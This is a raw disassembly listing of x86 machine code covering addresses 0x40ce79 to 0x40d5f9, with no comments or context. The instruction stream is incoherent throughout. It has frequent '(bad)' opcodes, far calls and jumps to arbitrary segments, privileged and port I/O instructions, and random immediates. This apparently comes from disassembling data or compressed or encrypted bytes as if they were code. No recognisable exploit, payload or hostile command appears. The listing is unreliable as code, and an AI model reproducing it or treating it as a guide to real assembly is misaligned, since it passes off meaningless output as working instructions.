  40ce79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce7a:	and    DWORD PTR [ebx+0x47],0x4d59f87e
  40ce81:	scas   al,BYTE PTR es:[edi]
  40ce82:	jo     0x40ce6f
  40ce84:	mov    dl,0xa7
  40ce86:	cli    
  40ce87:	imul   ecx,DWORD PTR [edx],0xfffffff4
  40ce8a:	sar    cl,0xe3
  40ce8d:	xchg   esi,eax
  40ce8e:	bnd js 0x40ce26
  40ce91:	loopne 0x40cebb
  40ce93:	jnp    0x40ce47
  40ce95:	mov    al,0xa9
  40ce97:	add    al,0x6e
  40ce99:	hlt    
  40ce9a:	bnd jle 0x40ce4b
  40ce9d:	xchg   ebx,eax
  40ce9e:	jae    0x40cf15
  40cea0:	sbb    al,0x68
  40cea2:	int    0xc9
  40cea4:	xlat   BYTE PTR ds:[ebx]
  40cea5:	pushf  
  40cea6:	cli    
  40cea7:	cld    
  40cea8:	repz or DWORD PTR [esi],edx
  40ceab:	div    BYTE PTR [edx-0x157415dd]
  40ceb1:	mov    al,ds:0xf285a30b
  40ceb6:	retf   0x770d
  40ceb9:	mov    ds,WORD PTR [ebp+eax*2+0x5a]
  40cebd:	add    esi,DWORD PTR [ecx+esi*2+0x3fa2b18c]
  40cec4:	dec    edi
  40cec5:	jle    0x40cf09
  40cec7:	push   eax
  40cec8:	push   ss
  40cec9:	int3   
  40ceca:	je     0x40cef3
  40cecc:	pop    esp
  40cecd:	call   0xe09b:0xe7ecfcec
  40ced4:	imul   esp,edi,0x7a058f1b
  40ceda:	mov    ecx,0xca3f0f63
  40cedf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cee0:	add    dh,cl
  40cee2:	fisttp WORD PTR [edi]
  40cee4:	test   BYTE PTR [ebp-0x1b],ch
  40cee7:	test   eax,0x7c818438
  40ceec:	jno    0x40ce9e
  40ceee:	call   0x6c15:0x35cfc60e
  40cef5:	push   eax
  40cef6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cef7:	and    BYTE PTR ds:0x26aa456e,cl
  40cefd:	inc    ebx
  40cefe:	mov    eax,0xcc057790
  40cf03:	ja     0x40cec3
  40cf05:	xor    BYTE PTR [eax-0x59],cl
  40cf08:	jecxz  0x40cf49
  40cf0a:	cs pushf 
  40cf0c:	mov    cl,0xca
  40cf0e:	iret   
  40cf0f:	xchg   ecx,eax
  40cf10:	pop    ds
  40cf11:	fsubp  st(7),st
  40cf13:	mov    bh,BYTE PTR ds:0xcc65a852
  40cf19:	les    ebx,FWORD PTR [ecx]
  40cf1b:	sub    BYTE PTR [ebx],dh
  40cf1d:	leave  
  40cf1e:	fnstenv [esp+ebp*2+0x4f]
  40cf22:	les    esp,FWORD PTR [edi]
  40cf24:	cwde   
  40cf25:	jo     0x40cebe
  40cf27:	push   ds
  40cf28:	scas   eax,DWORD PTR es:[edi]
  40cf29:	or     al,0xfc
  40cf2b:	test   BYTE PTR [ebp-0x75],0x57
  40cf2f:	call   0xb3fa2b3b
  40cf34:	fucomi st,st(3)
  40cf36:	addr16 test al,0xc9
  40cf39:	loope  0x40cfba
  40cf3b:	sbb    eax,0x685d69a5
  40cf40:	xor    BYTE PTR [edi+0x43b2b38c],0x53
  40cf47:	inc    edi
  40cf48:	mov    eax,0x977b0755
  40cf4d:	pop    esp
  40cf4e:	retf   0x4713
  40cf51:	pop    esp
  40cf52:	xor    eax,0x77c613c5
  40cf57:	jae    0x40cf63
  40cf59:	retf   0xa200
  40cf5c:	cmp    al,0x77
  40cf5e:	cmp    edi,DWORD PTR [eax+eax*2-0x6]
  40cf62:	lahf   
  40cf63:	retf   
  40cf64:	ins    DWORD PTR es:[edi],dx
  40cf65:	in     eax,0x25
  40cf67:	out    0x2a,al
  40cf69:	fs jmp 0x87d6:0x5fdb4bf3
  40cf71:	adc    ch,BYTE PTR [edx]
  40cf73:	fwait
  40cf74:	loopne 0x40cf69
  40cf76:	cmc    
  40cf77:	xor    al,0xcd
  40cf79:	and    DWORD PTR [esi+0x66],edx
  40cf7c:	xchg   ecx,eax
  40cf7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf7e:	cmp    DWORD PTR [eax],edx
  40cf80:	retf   
  40cf81:	out    dx,eax
  40cf82:	cmp    BYTE PTR [bx+di-0x72],dl
  40cf86:	outs   dx,DWORD PTR ds:[esi]
  40cf87:	add    dl,ah
  40cf89:	lock mov ebx,0x423853b
  40cf8f:	ja     0x40cfe6
  40cf91:	and    BYTE PTR [ebp-0x611128f3],dh
  40cf97:	(bad)  
  40cf98:	dec    eax
  40cf99:	(bad)  
  40cf9a:	dec    esp
  40cf9b:	and    eax,0x672d07da
  40cfa0:	leave  
  40cfa1:	popa   
  40cfa2:	stc    
  40cfa3:	sbb    ebx,DWORD PTR [esi]
  40cfa5:	adc    eax,0x8f126586
  40cfaa:	push   cs
  40cfab:	icebp  
  40cfac:	push   cs
  40cfad:	stos   DWORD PTR es:[edi],eax
  40cfae:	inc    edx
  40cfaf:	dec    ebx
  40cfb0:	mov    edx,0x144488c6
  40cfb5:	enter  0x665f,0x82
  40cfb9:	mov    ds:0xcf79f96b,al
  40cfbe:	cmp    BYTE PTR [edx+0x50b4bd8d],0x1b
  40cfc5:	lds    ebx,FWORD PTR [ebx+0x6]
  40cfc8:	mov    dh,al
  40cfca:	(bad)  
  40cfcb:	out    dx,al
  40cfcc:	and    dh,BYTE PTR [eax+0x59]
  40cfcf:	addr16 inc eax
  40cfd1:	jl     0x40cf91
  40cfd3:	mov    WORD PTR [ebx+0xde03706],?
  40cfd9:	repnz (bad) 
  40cfdc:	dec    esp
  40cfdd:	xor    BYTE PTR [ebx+0x52],0x3d
  40cfe1:	out    dx,al
  40cfe2:	fnstcw WORD PTR [eax+eax*4+0x6cecd1ac]
  40cfe9:	sti    
  40cfea:	push   ss
  40cfeb:	aas    
  40cfec:	test   DWORD PTR [edx-0x3175a25e],ebx
  40cff2:	cdq    
  40cff3:	sbb    eax,0xeef52497
  40cff8:	jnp    0x40cfe0
  40cffa:	sahf   
  40cffb:	fadd   st,st(7)
  40cffd:	sub    bl,ch
  40cfff:	cmp    ecx,DWORD PTR [ecx+0x3bef38cd]
  40d005:	add    bh,ah
  40d007:	das    
  40d008:	sub    al,0xa7
  40d00a:	and    eax,edi
  40d00c:	add    ah,BYTE PTR [ebx]
  40d00e:	sti    
  40d00f:	xor    edi,DWORD PTR [ebp-0x75]
  40d012:	and    eax,0xd0ef5c6b
  40d017:	cmp    ecx,ecx
  40d019:	mov    ebx,0xcbe2820f
  40d01e:	mov    ecx,ss
  40d020:	adc    cl,BYTE PTR [ecx+0x70]
  40d023:	xor    dl,BYTE PTR [eax+0x25440d7b]
  40d029:	rcr    DWORD PTR [edx],1
  40d02b:	sub    dh,BYTE PTR [ecx+eiz*4+0x62]
  40d02f:	xor    al,0xe5
  40d031:	in     eax,0xba
  40d033:	mov    dh,0xd1
  40d035:	push   es
  40d036:	repnz dec esi
  40d038:	rcr    BYTE PTR [ebp+0x5],1
  40d03b:	pop    esp
  40d03c:	sbb    BYTE PTR [eax+edx*4-0x3539399c],bl
  40d043:	in     al,dx
  40d044:	or     bh,BYTE PTR [ecx-0x4c69f4b5]
  40d04a:	mov    ds:0xc361a0af,eax
  40d04f:	loope  0x40d056
  40d051:	fdiv   QWORD PTR [ebx+ecx*8]
  40d054:	adc    BYTE PTR [edx+0x4b],bl
  40d057:	lds    edi,FWORD PTR [esi]
  40d059:	pop    ecx
  40d05a:	adc    bl,dl
  40d05c:	(bad)  
  40d05d:	sar    BYTE PTR [ecx+ebx*2],1
  40d060:	xor    esp,edi
  40d062:	sti    
  40d063:	jp     0x40d075
  40d065:	mov    ds:0x4893c9c3,al
  40d06a:	(bad)  
  40d06b:	adc    eax,0x288b706e
  40d070:	mov    esp,0x8a63c6e4
  40d075:	cmp    al,0xa3
  40d077:	pushf  
  40d078:	out    0x41,al
  40d07a:	test   ebx,edx
  40d07c:	sahf   
  40d07d:	cmp    eax,0xe012adf8
  40d082:	call   0x8490:0x8a583a68
  40d089:	hlt    
  40d08a:	dec    ebp
  40d08b:	fwait
  40d08c:	jmp    0x2207:0xb761bd6f
  40d093:	mov    ebx,0xb7fa1de7
  40d098:	xor    dh,BYTE PTR [ebp-0x79d10521]
  40d09e:	push   esp
  40d09f:	xor    DWORD PTR [edx+0x3c],esi
  40d0a2:	pusha  
  40d0a3:	scas   al,BYTE PTR es:[edi]
  40d0a4:	and    cl,bh
  40d0a6:	or     DWORD PTR [edi+0xf023275],0xffffffcc
  40d0ad:	and    DWORD PTR [ecx],0x9e8c38a3
  40d0b3:	(bad)  
  40d0b4:	dec    esp
  40d0b5:	les    esi,FWORD PTR [edi]
  40d0b7:	push   ebp
  40d0b8:	sbb    bh,BYTE PTR [ebx]
  40d0ba:	cmp    BYTE PTR ds:0x2dc57fc4,0xb7
  40d0c1:	fadd   DWORD PTR [ebx-0x1b]
  40d0c4:	sub    DWORD PTR [esi],edi
  40d0c6:	or     ah,bh
  40d0c8:	xchg   edx,eax
  40d0c9:	mov    ebx,0x4e2bbbac
  40d0ce:	pop    eax
  40d0cf:	leave  
  40d0d0:	mov    eax,0x2867f05e
  40d0d5:	mov    dl,0xd3
  40d0d7:	fdivr  QWORD PTR [edi-0x58b4e6a2]
  40d0dd:	xor    al,BYTE PTR [esi+0x794d0d65]
  40d0e3:	into   
  40d0e4:	outs   dx,DWORD PTR ds:[esi]
  40d0e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0e6:	retf   
  40d0e7:	jmp    0xa7e0:0x2f0e4917
  40d0ee:	sbb    edi,DWORD PTR [ebp+edx*8+0x668d84ff]
  40d0f5:	dec    BYTE PTR [ecx+ecx*4+0x6d871c]
  40d0fc:	js     0x40d173
  40d0fe:	mov    bh,0xc8
  40d100:	pushf  
  40d101:	jl     0x40d0d4
  40d103:	inc    esp
  40d104:	xchg   ecx,eax
  40d105:	shl    DWORD PTR [eax+0x27],cl
  40d108:	cdq    
  40d109:	xor    esi,esp
  40d10b:	mov    DWORD PTR [edi-0x7a8b150c],ecx
  40d111:	xchg   edi,eax
  40d112:	inc    esp
  40d113:	jbe    0x40d0c6
  40d115:	mov    edx,0xea07d824
  40d11a:	mov    dh,0x0
  40d11c:	jnp    0x40d147
  40d11e:	inc    esi
  40d11f:	gs inc esp
  40d121:	add    al,0x3d
  40d123:	mov    eax,ds:0xdb279fb1
  40d128:	xor    bl,dh
  40d12a:	clc    
  40d12b:	mov    dh,0x91
  40d12d:	add    ah,0x5
  40d130:	xor    eax,0x8fff4092
  40d135:	cmp    DWORD PTR [ebp-0x32c3cfab],0x5caa5320
  40d13f:	(bad)  [edx-0x3f]
  40d142:	pop    esp
  40d143:	das    
  40d144:	push   0x873fd5fc
  40d149:	inc    edi
  40d14a:	inc    ebx
  40d14b:	arpl   WORD PTR [eax+0x2da62900],bp
  40d151:	fstp   TBYTE PTR [edi+esi*2-0x7f90fe77]
  40d158:	aad    0xd9
  40d15a:	add    bh,BYTE PTR [esi]
  40d15c:	scas   al,BYTE PTR es:[edi]
  40d15d:	fsubr  QWORD PTR [edx-0x12]
  40d160:	add    eax,0x93f5f054
  40d165:	sub    al,BYTE PTR [ecx-0x16]
  40d168:	jae    0x40d0f4
  40d16a:	xchg   DWORD PTR [edx-0x78],edx
  40d16d:	mov    bl,BYTE PTR [esi+0x75]
  40d170:	ins    BYTE PTR es:[edi],dx
  40d171:	scas   eax,DWORD PTR es:[edi]
  40d172:	test   esp,edx
  40d174:	pop    es
  40d175:	mov    BYTE PTR [eax+0x4cd5630d],cl
  40d17b:	mov    eax,ds:0xd8c780f7
  40d180:	inc    edx
  40d181:	jbe    0x40d1bc
  40d183:	and    bh,BYTE PTR [esi-0x47]
  40d186:	and    esi,DWORD PTR [ebx-0x3f]
  40d189:	inc    esi
  40d18a:	stos   BYTE PTR es:[edi],al
  40d18b:	repnz and eax,DWORD PTR [eax]
  40d18e:	jge    0x40d199
  40d190:	je     0x40d1e8
  40d192:	push   ss
  40d193:	fndisi(8087 only) 
  40d195:	stos   DWORD PTR es:[edi],eax
  40d196:	jg     0x40d1db
  40d198:	ss ins BYTE PTR es:[edi],dx
  40d19a:	out    0x24,eax
  40d19c:	fisubr WORD PTR [edx+0x61983732]
  40d1a2:	test   al,0x50
  40d1a4:	sbb    al,0xc
  40d1a6:	cwde   
  40d1a7:	and    BYTE PTR ds:0x2ce06a39,dh
  40d1ad:	sub    al,0x68
  40d1af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1b0:	mov    ah,0xfd
  40d1b2:	sbb    ecx,DWORD PTR [edx-0x3c7ff763]
  40d1b8:	(bad)  
  40d1b9:	imul   ch
  40d1bb:	jmp    0x40d155
  40d1bd:	test   eax,0xb411a25e
  40d1c2:	outs   dx,BYTE PTR ds:[esi]
  40d1c3:	jp     0x40d1bd
  40d1c5:	push   esi
  40d1c6:	cmc    
  40d1c7:	neg    DWORD PTR [ebx]
  40d1c9:	fild   QWORD PTR [ecx]
  40d1cb:	fist   DWORD PTR [ecx-0x63b17e24]
  40d1d1:	je     0x40d1aa
  40d1d3:	mov    dh,0x17
  40d1d5:	sub    al,0x3e
  40d1d7:	scas   al,BYTE PTR es:[edi]
  40d1d8:	sbb    eax,0x5ada6977
  40d1dd:	mov    ebp,0x6f4f0e39
  40d1e2:	imul   edi,DWORD PTR [eax-0x37c0aafe],0x1c61b57f
  40d1ec:	cmp    ebp,DWORD PTR [edx-0x23]
  40d1ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1f0:	fnsave [ecx]
  40d1f2:	pop    edi
  40d1f3:	push   ebp
  40d1f4:	in     al,0x96
  40d1f6:	mov    edx,0xe5797212
  40d1fb:	sbb    BYTE PTR [esi+0x5d],dl
  40d1fe:	cmp    cl,ch
  40d200:	mov    bl,0x3a
  40d202:	fild   QWORD PTR [ebx+0x47]
  40d205:	pop    esi
  40d206:	loop   0x40d22b
  40d208:	inc    edx
  40d209:	std    
  40d20a:	aas    
  40d20b:	adc    edx,DWORD PTR [edx]
  40d20d:	mov    edx,0x694c352d
  40d212:	inc    eax
  40d213:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d214:	add    edi,DWORD PTR [ebp-0x13e18e70]
  40d21a:	push   ds
  40d21b:	pushf  
  40d21c:	sbb    BYTE PTR [ecx-0x523396aa],bl
  40d222:	popa   
  40d223:	clc    
  40d224:	fs call 0x374d:0xe9b17a34
  40d22c:	into   
  40d22d:	in     eax,dx
  40d22e:	frndint 
  40d230:	in     eax,0x99
  40d232:	aad    0xdf
  40d234:	fst    DWORD PTR [edx+0xb6e01ef]
  40d23a:	dec    eax
  40d23b:	pushf  
  40d23c:	cmp    eax,0xb7ce189
  40d241:	add    bl,bl
  40d243:	adc    ebx,DWORD PTR [esi]
  40d245:	cs test cl,bh
  40d248:	mov    cl,0x19
  40d24a:	js     0x40d1e6
  40d24c:	pop    ss
  40d24d:	cld    
  40d24e:	test   al,0x32
  40d250:	jmp    0x781e:0x7559fbba
  40d257:	mov    dh,0xf9
  40d259:	add    esp,DWORD PTR [edx-0xf]
  40d25c:	adc    al,0xf5
  40d25e:	mov    ch,0x34
  40d260:	pop    ds
  40d261:	cmp    ecx,ecx
  40d263:	pop    ebp
  40d264:	lahf   
  40d265:	nop
  40d266:	adc    DWORD PTR [ecx-0x1626dfe5],eax
  40d26c:	push   0xe5faee6a
  40d271:	lds    ecx,FWORD PTR [eax+edi*1-0x520f05b2]
  40d278:	lahf   
  40d279:	adc    bl,bl
  40d27b:	cs push ds
  40d27d:	xor    al,0x3
  40d27f:	cmp    edi,ecx
  40d281:	mov    ecx,0xd05879bf
  40d286:	push   edi
  40d287:	sbb    esp,ebx
  40d289:	pushf  
  40d28a:	add    DWORD PTR [ebp+0xb6950cc],esi
  40d290:	push   ebx
  40d291:	jmp    0x40d28f
  40d293:	popa   
  40d294:	addr16 adc al,0xa9
  40d297:	aaa    
  40d298:	(bad)  
  40d299:	or     edx,DWORD PTR [ebp-0x1]
  40d29c:	mov    BYTE PTR [eax+0xa65ecd7],dl
  40d2a2:	sub    al,0x96
  40d2a4:	mov    ah,0xd6
  40d2a6:	shl    DWORD PTR [ebx+0x7d3f23b0],0x5b
  40d2ad:	adc    BYTE PTR [ebp+0x432ec630],ah
  40d2b3:	aad    0xde
  40d2b5:	retf   0x8f13
  40d2b8:	out    0xe1,al
  40d2ba:	aaa    
  40d2bb:	mov    al,ds:0x456af038
  40d2c0:	(bad)  
  40d2c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2c2:	outs   dx,DWORD PTR ds:[esi]
  40d2c3:	lods   eax,DWORD PTR ds:[esi]
  40d2c4:	adc    BYTE PTR [esi],dl
  40d2c6:	pusha  
  40d2c7:	int    0xd3
  40d2c9:	or     BYTE PTR [edi+edi*8+0x50f04135],ch
  40d2d0:	outs   dx,DWORD PTR ds:[esi]
  40d2d1:	xchg   ebx,eax
  40d2d2:	inc    ebx
  40d2d3:	inc    esp
  40d2d4:	leave  
  40d2d5:	inc    ebx
  40d2d6:	jmp    0x40d28e
  40d2d8:	xor    eax,0x3a06340
  40d2dd:	sahf   
  40d2de:	adc    ebp,ecx
  40d2e0:	out    0xc7,eax
  40d2e2:	rcr    ecx,0x8b
  40d2e5:	mov    ch,0x2a
  40d2e7:	jb     0x40d362
  40d2e9:	cmp    DWORD PTR [edi],ebx
  40d2eb:	sub    eax,DWORD PTR [esi]
  40d2ed:	pop    ds
  40d2ee:	addr16 loope 0x40d2ea
  40d2f1:	or     BYTE PTR [edi],al
  40d2f3:	js     0x40d298
  40d2f5:	add    ecx,DWORD PTR ds:0xad0c3da1
  40d2fb:	sub    BYTE PTR [esi+edi*1],cl
  40d2fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2ff:	add    esi,DWORD PTR [esi+0x239671dc]
  40d305:	pop    edx
  40d306:	out    dx,al
  40d307:	push   ds
  40d308:	mov    ch,0x7a
  40d30a:	or     eax,0xdbad0ac6
  40d30f:	sbb    DWORD PTR [ebp-0x4e],ebp
  40d312:	arpl   WORD PTR [ebx-0x37d46500],sp
  40d318:	add    BYTE PTR [edi-0x5b88a10e],dh
  40d31e:	arpl   WORD PTR [ebp-0x15],bx
  40d321:	data16 mov al,0x15
  40d324:	cmp    DWORD PTR [edi+edi*2-0x67],edx
  40d328:	push   edi
  40d329:	loope  0x40d363
  40d32b:	sbb    eax,DWORD PTR [ecx+0x61]
  40d32e:	sub    ebp,DWORD PTR [esp+edx*8]
  40d331:	fwait
  40d332:	out    0xbc,al
  40d334:	ss xchg edi,eax
  40d336:	push   esi
  40d337:	popa   
  40d338:	invd   
  40d33a:	loopne 0x40d2bf
  40d33c:	xchg   ebx,eax
  40d33d:	dec    edi
  40d33e:	push   ecx
  40d33f:	dec    esp
  40d340:	scas   al,BYTE PTR es:[edi]
  40d341:	mov    edi,DWORD PTR [eax]
  40d343:	aam    0x0
  40d345:	push   es
  40d346:	mov    al,ds:0x6157a215
  40d34b:	mov    dl,0x5e
  40d34d:	sub    esi,esi
  40d34f:	rol    DWORD PTR [edi],cl
  40d351:	in     al,0xc1
  40d353:	lods   al,BYTE PTR ds:[esi]
  40d354:	adc    eax,0x1facd2a0
  40d359:	neg    DWORD PTR [edi-0x174eb91]
  40d35f:	cwde   
  40d360:	loopne 0x40d3d3
  40d362:	in     al,dx
  40d363:	scas   eax,DWORD PTR es:[edi]
  40d364:	rcr    DWORD PTR [ebp-0x567b6865],1
  40d36a:	mov    eax,0x8ad6c1b7
  40d36f:	popf   
  40d370:	cmc    
  40d371:	sub    eax,0x6d9f5f2e
  40d376:	and    esi,DWORD PTR [ebp-0x780d3aaa]
  40d37c:	sbb    eax,0x56e537b3
  40d381:	(bad)  
  40d382:	sti    
  40d383:	jmp    DWORD PTR [ebx+0x20db9011]
  40d389:	lock dec DWORD PTR [ecx+0x25]
  40d38d:	sti    
  40d38e:	push   0x2e
  40d390:	fild   WORD PTR [ebx-0x4a]
  40d393:	pop    ebp
  40d394:	icebp  
  40d395:	pusha  
  40d396:	add    dl,BYTE PTR [edi]
  40d398:	loop   0x40d3ef
  40d39a:	mov    ds:0x370561b4,al
  40d39f:	test   DWORD PTR [edi],0xa770e7dc
  40d3a5:	sbb    al,0x94
  40d3a7:	sar    ebx,1
  40d3a9:	call   0x2c58:0x48b70c28
  40d3b0:	or     eax,0x296530a
  40d3b5:	xor    eax,0x9c1ace8a
  40d3ba:	sub    ebx,DWORD PTR [edx]
  40d3bc:	ds push esi
  40d3be:	or     ebx,DWORD PTR [edx+0x7fb02961]
  40d3c4:	out    dx,eax
  40d3c5:	fdivr  st(4),st
  40d3c7:	mov    esp,0x6be4d364
  40d3cc:	jnp    0x40d44c
  40d3ce:	mov    ecx,0xf85ade73
  40d3d3:	fdivrp st(2),st
  40d3d5:	add    BYTE PTR [edi+0x46e45eee],dl
  40d3db:	int    0x6
  40d3dd:	call   0xd8bb329
  40d3e2:	jo     0x40d3a7
  40d3e4:	cdq    
  40d3e5:	pop    ss
  40d3e6:	call   0x6570:0x69bcde01
  40d3ed:	jg     0x40d3e4
  40d3ef:	push   0xffffff9a
  40d3f1:	xor    dl,BYTE PTR [ebx+0x4d]
  40d3f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3f5:	push   eax
  40d3f6:	jns    0x40d3c9
  40d3f8:	add    DWORD PTR [ebp-0x76],eax
  40d3fb:	push   es
  40d3fc:	aad    0x7f
  40d3fe:	in     al,0x70
  40d400:	jmp    0xcc7:0xae52b799
  40d407:	push   esp
  40d408:	pop    edx
  40d409:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d40a:	push   ebp
  40d40b:	sub    DWORD PTR [ebx+0x5d8852ad],0x3ca8b501
  40d415:	retf   
  40d416:	fiadd  DWORD PTR [ebp*8+0x641fa18e]
  40d41d:	sar    DWORD PTR [edi],1
  40d41f:	mov    dh,0x4b
  40d421:	add    bh,dh
  40d423:	icebp  
  40d424:	adc    edi,DWORD PTR [ebx]
  40d426:	test   al,0x9
  40d428:	(bad)  [esi]
  40d42a:	mov    cl,0x51
  40d42c:	bound  edi,QWORD PTR [eax+esi*2]
  40d42f:	dec    ebp
  40d430:	sub    DWORD PTR [edi+0x29504488],0x4eb4c77f
  40d43a:	cwde   
  40d43b:	scas   al,BYTE PTR es:[edi]
  40d43c:	div    edx
  40d43e:	addr16 ret 0xd09c
  40d442:	sar    BYTE PTR [edi-0x22],cl
  40d445:	dec    edx
  40d446:	sub    ecx,DWORD PTR [ebx-0x6d1adf4]
  40d44c:	out    dx,eax
  40d44d:	fcomip st,st(3)
  40d44f:	xchg   ecx,eax
  40d450:	mov    ebp,DWORD PTR [ebp-0x1907c8b6]
  40d456:	lea    ebp,[esi-0x74]
  40d459:	xor    BYTE PTR [ebx-0x50],cl
  40d45c:	(bad)  
  40d45d:	sbb    eax,0xa3d7df04
  40d462:	inc    edx
  40d463:	xor    bl,ch
  40d465:	loop   0x40d3fc
  40d467:	push   esi
  40d468:	mov    edi,0xda5a24de
  40d46d:	mov    edx,DWORD PTR [esi-0x4b]
  40d470:	bound  esp,QWORD PTR [edx+0x4b60ecd5]
  40d476:	dec    esp
  40d477:	push   ds
  40d478:	in     eax,dx
  40d479:	or     BYTE PTR [ebx+0xd9ebc64],ch
  40d47f:	mov    eax,ds:0x5a0767f1
  40d484:	jle    0x40d4bc
  40d486:	xchg   edx,eax
  40d487:	push   edi
  40d488:	scas   eax,DWORD PTR es:[edi]
  40d489:	jae    0x40d419
  40d48b:	fcomip st,st(6)
  40d48d:	bound  edx,QWORD PTR [eax+edi*1+0x7f]
  40d491:	pop    ds
  40d492:	or     dl,BYTE PTR [eax+0xbf9e29f]
  40d498:	or     DWORD PTR [ebx+0x3c],ecx
  40d49b:	jmp    0xedf7d2e1
  40d4a0:	ds or  ecx,edx
  40d4a3:	jns    0x40d496
  40d4a5:	xchg   BYTE PTR [ebx+0x6bc1cca5],al
  40d4ab:	push   es
  40d4ac:	jno    0x40d4d5
  40d4ae:	sub    BYTE PTR [edi*1+0x24374cd0],cl
  40d4b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4b6:	jmp    DWORD PTR [esi-0x68]
  40d4b9:	test   DWORD PTR [edx],edx
  40d4bb:	push   esi
  40d4bc:	add    ah,BYTE PTR [ebp+ecx*8+0x5d8bb8d5]
  40d4c3:	dec    ebp
  40d4c4:	imul   esi,DWORD PTR [eax],0xbec6f5ba
  40d4ca:	mov    ds:0xb443812c,eax
  40d4cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4d0:	pop    edx
  40d4d1:	bound  esi,QWORD PTR [esp+esi*4-0x4509c1f8]
  40d4d8:	xlat   BYTE PTR ds:[ebx]
  40d4d9:	scas   eax,DWORD PTR es:[edi]
  40d4da:	test   ebx,eax
  40d4dc:	daa    
  40d4dd:	sahf   
  40d4de:	xor    BYTE PTR [eax-0x17e53308],bh
  40d4e4:	aas    
  40d4e5:	(bad)  
  40d4e6:	mov    al,ds:0xba42dcab
  40d4eb:	and    DWORD PTR [edi],esi
  40d4ed:	push   ebx
  40d4ee:	test   al,0xd1
  40d4f0:	push   edx
  40d4f1:	fcom   QWORD PTR [edi+0x526185d1]
  40d4f7:	mov    ecx,0xbe30968
  40d4fc:	adc    BYTE PTR [edi],cl
  40d4fe:	inc    edx
  40d4ff:	fld    QWORD PTR [ebp+0x4f]
  40d502:	(bad)  
  40d503:	sub    ebx,eax
  40d505:	or     al,BYTE PTR [esi]
  40d507:	(bad)  
  40d508:	aad    0xc9
  40d50a:	repnz ds in al,0xc2
  40d50e:	out    dx,al
  40d50f:	and    ebx,ecx
  40d511:	outs   dx,DWORD PTR ds:[esi]
  40d512:	test   DWORD PTR [eax],ecx
  40d514:	repnz outs dx,BYTE PTR ds:[esi]
  40d516:	push   esp
  40d517:	mov    esp,0x1a27ecba
  40d51c:	mov    dl,bl
  40d51e:	xchg   esp,eax
  40d51f:	nop
  40d520:	loope  0x40d56e
  40d522:	sbb    ch,BYTE PTR [edi]
  40d524:	xchg   edi,eax
  40d525:	daa    
  40d526:	and    al,0xec
  40d528:	int3   
  40d529:	sub    esi,DWORD PTR [ebp+0x51]
  40d52c:	xchg   esp,eax
  40d52d:	jae    0x40d4fb
  40d52f:	lahf   
  40d530:	mov    edx,0x4f66ce03
  40d535:	jmp    0x2f46:0xdffa67ec
  40d53c:	pushf  
  40d53d:	push   esp
  40d53e:	clc    
  40d53f:	inc    eax
  40d540:	inc    eax
  40d541:	and    DWORD PTR [ebp+0x3f5e272e],ecx
  40d547:	or     ebp,DWORD PTR [esi-0x77]
  40d54a:	lds    esp,FWORD PTR [ecx]
  40d54c:	je     0x40d551
  40d54e:	xchg   BYTE PTR ds:0xbab070ca,bl
  40d554:	or     dl,dh
  40d556:	sbb    DWORD PTR [ebp+0x4],esp
  40d559:	lock int3 
  40d55b:	jne    0x40d546
  40d55d:	fld    TBYTE PTR [esi-0x5e]
  40d560:	pop    ecx
  40d561:	mul    DWORD PTR [edi]
  40d563:	aad    0x90
  40d565:	sbb    BYTE PTR [esi+0x1991e8f],al
  40d56b:	and    al,0x7f
  40d56d:	fldcw  WORD PTR [ebx-0x4b1503a3]
  40d573:	lahf   
  40d574:	mov    bl,0xaf
  40d576:	mov    eax,ds:0xb8834908
  40d57b:	pusha  
  40d57c:	xor    esp,DWORD PTR [ebx+0x4bbc7c58]
  40d582:	dec    edx
  40d583:	aam    0x9f
  40d585:	popf   
  40d586:	add    BYTE PTR [edx-0x7b],cl
  40d589:	das    
  40d58a:	and    eax,DWORD PTR [esi-0x1e]
  40d58d:	push   cs
  40d58e:	mov    ch,0xdc
  40d590:	mov    al,ds:0x48b7b145
  40d595:	ret    
  40d596:	fidivr WORD PTR [ebx]
  40d598:	mov    al,ds:0x17c2e567
  40d59d:	mov    ds:0xa1cb6871,eax
  40d5a2:	lahf   
  40d5a3:	aam    0xc7
  40d5a5:	cs or  ch,dl
  40d5a8:	add    al,0x43
  40d5aa:	push   cs
  40d5ab:	aas    
  40d5ac:	adc    DWORD PTR [ecx-0x1ea747f1],ecx
  40d5b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5b3:	jg     0x40d597
  40d5b5:	leave  
  40d5b6:	push   ebx
  40d5b7:	sbb    DWORD PTR [eax-0x6500bb97],ebx
  40d5bd:	jmp    0xb1f675b4
  40d5c2:	mov    dl,0x80
  40d5c4:	mov    eax,ds:0xfb1683ed
  40d5c9:	push   edi
  40d5ca:	xor    BYTE PTR [edx+0x4ad79b9],dh
  40d5d0:	fwait
  40d5d1:	xchg   ebx,eax
  40d5d2:	xchg   ebp,eax
  40d5d3:	repz xchg ebp,eax
  40d5d5:	fsubr  DWORD PTR [ebx]
  40d5d7:	arpl   WORD PTR ds:0x995ab7f4,si
  40d5dd:	pop    ecx
  40d5de:	push   es
  40d5df:	mov    ebx,0x4702d4ec
  40d5e4:	push   ss
  40d5e5:	aas    
  40d5e6:	inc    ebx
  40d5e7:	sbb    al,0xaa
  40d5e9:	jmp    0x40d645
  40d5eb:	sub    ebp,DWORD PTR [ecx-0x2b]
  40d5ee:	scas   eax,DWORD PTR es:[edi]
  40d5ef:	ja     0x40d5da
  40d5f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5f2:	nop
  40d5f3:	stos   BYTE PTR es:[edi],al
  40d5f4:	(bad)  
  40d5f5:	cs jle 0x40d5e1
  40d5f8:	aaa    
  40d5f9:	mov    bh,0xa
